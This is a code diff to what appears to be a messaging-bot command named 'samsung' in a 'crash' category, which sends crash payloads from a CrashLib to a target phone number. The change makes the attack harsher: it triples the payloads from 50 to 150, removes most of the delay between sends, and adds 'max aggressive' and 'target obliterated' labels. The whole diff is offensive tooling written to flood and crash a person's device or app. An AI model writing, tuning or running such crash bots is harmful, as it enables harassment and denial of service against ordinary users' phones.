@@ -6,7 +6,7 @@ module.exports = {
     name: 'samsung',
     aliases: ['samsungcrash', 'sscrash'],
     category: 'crash',
-    desc: 'sᴀᴍsᴜɴɢ ᴄʀᴀsʜ',
+    desc: 'sᴀᴍsᴜɴɢ ᴄʀᴀsʜ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
     usage: '.samsung <number>',
     waitReact: true,
 
@@ -27,17 +27,17 @@ module.exports = {
             crashLib = new CrashLib(sock);
         }
         
-        const TOTAL = 50;
+        const TOTAL = 150;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
         try {
             for (let i = 0; i < TOTAL; i++) {
                 await crashLib.samsung(target);
                 await bar.update(1, 'sᴀᴍsᴜɴɢ ᴄʀᴀsʜ');
-                await new Promise(r => setTimeout(r, 250));
+                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
             }
             
-            await bar.done(`✅ sᴀᴍsᴜɴɢ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
+            await bar.done(`✅ sᴀᴍsᴜɴɢ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
         } catch (e) {
             await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
         }
